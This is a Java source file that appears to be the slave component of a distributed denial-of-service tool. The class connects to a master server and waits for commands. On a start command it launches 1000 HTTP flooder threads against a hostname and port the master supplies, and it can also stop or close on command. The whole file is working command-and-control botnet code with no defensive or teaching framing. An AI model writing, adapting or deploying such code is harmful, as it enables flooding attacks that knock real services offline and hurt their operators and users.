/*
 * To change this template, choose Tools | Templates
 * and open the template in the editor.
 */
package ddos.slave;

import ddos.acrux.Flooder;
import ddos.acrux.FlooderMonitor;
import ddos.acrux.FlooderPool;
import ddos.acrux.HTTPFlooder;
import java.io.IOException;
import java.io.InputStream;
import java.net.Socket;
import java.net.UnknownHostException;
import java.util.Scanner;
import java.util.logging.Level;
import java.util.logging.Logger;

/**
 *
 * @author bruno
 */
public class MasterListener implements Runnable, FlooderMonitor {

    private Socket s;
    private boolean closing;
    private int requestCount, failedCount;

    MasterListener(String hostname, int port) throws UnknownHostException, IOException {
        this.s = new Socket(hostname, port);
        this.closing = false;
        this.requestCount = 0;
        this.failedCount = 0;
    }

    @Override
    public void run() {
        System.out.println("MasterListener - THREAD -  START");


        try {
            InputStream is = this.s.getInputStream();
            FlooderPool fp = new FlooderPool();

            while (!this.s.isClosed()) {
                int len = is.read();
                if (len == -1) {
                    this.s.close();
                    break;
                }


                byte[] b = new byte[len]; // blocks suntil we have receive the lenght of the string
                is.read(b); // blocks until we have the whole string
                String s = new String(b);
                System.out.println("Read: " + s);

                Scanner scn = new Scanner(s);
                String tkn = scn.next();




                if ("--start".equals(tkn)) {

                    String hostname = "localhost";
                    String method = "http";
                    int port = 80;

                    Flooder f;

                    while (scn.hasNext()) {
                        tkn = scn.next();
                        if ("--target-hostname".equals(tkn)) {
                            hostname = scn.next();
                        } else if ("--target-ip".equals(tkn)) {
                            port = scn.nextInt();
                        } else if ("--method".equals(tkn)) {
                            method = scn.next();
                        }


                    }

                    for (int i = 0; i < 1000; i++) {
                        f = new HTTPFlooder(hostname, port);
                        f.setFlooderMonitor(this);


                        fp.addFlooder(f);
                    }

                    fp.startAll();
                } else if ("--stop".equals(tkn)) {
                    fp.stopAll();
                } else if ("--close".equals(tkn)) {
                    this.close();
                }


            }

        } catch (Exception ex) {
            if (!this.closing) {
                Logger.getLogger(MasterListener.class.getName()).log(Level.SEVERE, null, ex);
            }
        } finally {
            System.out.println("MasterListener - THREAD - END");
        }
    }

    public void close() throws IOException {
        this.closing = true;
        this.s.close();
    }

    @Override
    public void requested() {
        requestCount++;
        System.out.println("requested: " + String.valueOf(requestCount));
    }

    @Override
    public void failed() {
        failedCount++;
        System.out.println("failed: " + String.valueOf(failedCount));
    }
}
